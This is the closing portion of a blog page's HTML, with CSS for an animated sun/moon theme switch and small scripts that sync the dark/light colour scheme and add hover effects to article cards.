  .theme-switch__spot:nth-of-type(2) {
    width: 0.375em;
    height: 0.375em;
    top: 0.937em;
    left: 1.375em;
  }

  .theme-switch__spot:nth-last-of-type(3) {
    width: 0.25em;
    height: 0.25em;
    top: 0.312em;
    left: 0.812em;
  }

  .theme-switch__clouds {
    width: 1.25em;
    height: 1.25em;
    background-color: var(--clouds-color);
    border-radius: var(--container-radius);
    position: absolute;
    bottom: -0.625em;
    left: 0.312em;
    -webkit-box-shadow: 0.937em 0.312em var(--clouds-color), -0.312em -0.312em var(--back-clouds-color), 1.437em 0.375em var(--clouds-color), 0.5em -0.125em var(--back-clouds-color), 2.187em 0 var(--clouds-color), 1.25em -0.062em var(--back-clouds-color), 2.937em 0.312em var(--clouds-color), 2em -0.312em var(--back-clouds-color), 3.625em -0.062em var(--clouds-color), 2.625em 0em var(--back-clouds-color), 4.5em -0.312em var(--clouds-color), 3.375em -0.437em var(--back-clouds-color), 4.625em -1.75em 0 0.437em var(--clouds-color), 4em -0.625em var(--back-clouds-color), 4.125em -2.125em 0 0.437em var(--back-clouds-color);
    box-shadow: 0.937em 0.312em var(--clouds-color), -0.312em -0.312em var(--back-clouds-color), 1.437em 0.375em var(--clouds-color), 0.5em -0.125em var(--back-clouds-color), 2.187em 0 var(--clouds-color), 1.25em -0.062em var(--back-clouds-color), 2.937em 0.312em var(--clouds-color), 2em -0.312em var(--back-clouds-color), 3.625em -0.062em var(--clouds-color), 2.625em 0em var(--back-clouds-color), 4.5em -0.312em var(--clouds-color), 3.375em -0.437em var(--back-clouds-color), 4.625em -1.75em 0 0.437em var(--clouds-color), 4em -0.625em var(--back-clouds-color), 4.125em -2.125em 0 0.437em var(--back-clouds-color);
    -webkit-transition: 0.5s cubic-bezier(0, -0.02, 0.4, 1.25);
    -o-transition: 0.5s cubic-bezier(0, -0.02, 0.4, 1.25);
    transition: 0.5s cubic-bezier(0, -0.02, 0.4, 1.25);
  }

  .theme-switch__stars-container {
    position: absolute;
    color: var(--stars-color);
    top: -100%;
    left: 0.312em;
    width: 2.75em;
    height: auto;
    -webkit-transition: var(--transition);
    -o-transition: var(--transition);
    transition: var(--transition);
  }

  .theme-switch__checkbox:checked + .theme-switch__container {
    background-color: var(--container-night-bg);
  }

  .theme-switch__checkbox:checked + .theme-switch__container .theme-switch__circle-container {
    left: calc(100% - var(--circle-container-offset) - var(--circle-container-diameter));
  }

  .theme-switch__checkbox:checked + .theme-switch__container .theme-switch__circle-container:hover {
    left: calc(100% - var(--circle-container-offset) - var(--circle-container-diameter) - 0.187em)
  }

  .theme-switch__circle-container:hover {
    left: calc(var(--circle-container-offset) + 0.187em);
  }

  .theme-switch__checkbox:checked + .theme-switch__container .theme-switch__moon {
    -webkit-transform: translate(0);
    -ms-transform: translate(0);
    transform: translate(0);
    transform: translate(0);
  }

  .theme-switch__checkbox:checked + .theme-switch__container .theme-switch__clouds {
    bottom: -4.062em;
  }

  .theme-switch__checkbox:checked + .theme-switch__container .theme-switch__stars-container {
    top: 50%;
    -webkit-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    transform: translateY(-50%);
  }

  #dark-mode-toggle { display: none !important; }
  .dark-mode-toggle-fix span { font-size: 18px !important; font-weight: 600 !important; }
</style>

<script>
(function() {
  'use strict';
  if (window.themeSwitchInitialized) return;
  let isInitialized = false;
  let observer = null;
  function initNewThemeSwitch() {
    if (isInitialized) return;
    const checkbox = document.getElementById('theme-switch-checkbox');
    if (!checkbox) return;
    function updateCheckboxState() {
      const isDark = document.documentElement.dataset.scheme === 'dark';
      checkbox.checked = isDark;
      const textElement = document.getElementById('theme-switch-text');
      if (textElement) textElement.textContent = isDark ? 'æš—è‰²æ¨¡å¼' : 'äº®è‰²æ¨¡å¼';
    }
    function waitForThemeSystem() {
      const schemeFromData = document.documentElement.dataset.scheme;
      const schemeFromClass = document.documentElement.className.includes('dark') ? 'dark' : (document.documentElement.className.includes('light') ? 'light' : null);
      const schemeFromLocalStorage = localStorage.getItem('StackColorScheme');
      if (schemeFromData || schemeFromClass || schemeFromLocalStorage) {
        let finalScheme = schemeFromData || schemeFromClass || schemeFromLocalStorage;
        if (schemeFromData) finalScheme = schemeFromData;
        document.documentElement.dataset.scheme = finalScheme;
        updateCheckboxState();
        isInitialized = true;
        window.themeSwitchInitialized = true;
      } else { setTimeout(waitForThemeSystem, 100); }
    }
    waitForThemeSystem();
    checkbox.addEventListener('change', function() {
      const scheme = this.checked ? 'dark' : 'light';
      document.documentElement.dataset.scheme = scheme;
      localStorage.setItem('StackColorScheme', scheme);
      document.dispatchEvent(new CustomEvent('onColorSchemeChange'));
    });
    window.addEventListener('onColorSchemeChange', updateCheckboxState);
    observer = new MutationObserver(function(mutations) {
      mutations.forEach(function(mutation) {
        if (mutation.type === 'attributes' && mutation.attributeName === 'data-scheme') updateCheckboxState();
      });
    });
    observer.observe(document.documentElement, { attributes: true, attributeFilter: ['data-scheme'] });
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initNewThemeSwitch); else initNewThemeSwitch();
  setTimeout(initNewThemeSwitch, 1500);
})();
</script>

<script>
(function() {
  'use strict';
  if (window.hoverEffectsInitialized) return;
  let isHoverEffectsInitialized = false;
  let hoverObserver = null;
  function forceCategoryHoverEffects() {
    if (isHoverEffectsInitialized) return;
    const articles = document.querySelectorAll('.article-list--compact article');
    if (articles.length > 0) {
      articles.forEach(article => {
        if (article.hasAttribute('data-hover-initialized')) return;
        article.style.setProperty('transition', 'all 0.3s ease', 'important');
        article.style.setProperty('will-change', 'transform, box-shadow', 'important');
        article.addEventListener('mouseenter', function() { this.style.setProperty('transform', 'translateY(-5px)', 'important'); this.style.setProperty('box-shadow', '0 10px 30px rgba(0, 0, 0, 0.12)', 'important'); });
        article.addEventListener('mouseleave', function() { this.style.setProperty('transform', 'translateY(0)', 'important'); this.style.setProperty('box-shadow', 'none', 'important'); });
        article.setAttribute('data-hover-initialized', 'true');
      });
      isHoverEffectsInitialized = true;
      window.hoverEffectsInitialized = true;
    }
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', forceCategoryHoverEffects); else forceCategoryHoverEffects();
  setTimeout(forceCategoryHoverEffects, 1000);
  hoverObserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      if (mutation.type === 'childList' && mutation.addedNodes.length > 0) setTimeout(forceCategoryHoverEffects, 100);
    });
  });
  hoverObserver.observe(document.body, { childList: true, subtree: true });
})();
</script>


<script src="/js/main-custom.ff65abb524f5e2b2b4cd9d24ab4f68c844f46989e54d5b820a1494ed1a208056.js" integrity="sha256-/2WrtST14rK0zZ0kq09oyET0aYnlTVuCChSU7RoggFY=" defer></script><script src="/js/terminal.3d63f2a720f09220def6ec539283a06dd56b5e750ce307dcc8676376fa76f71e.js" integrity="sha256-PWPypyDwkiDe9uxTkoOgbdVrXnUM4wfcyGdjdvp29x4=" defer></script>
    </body>
</html>
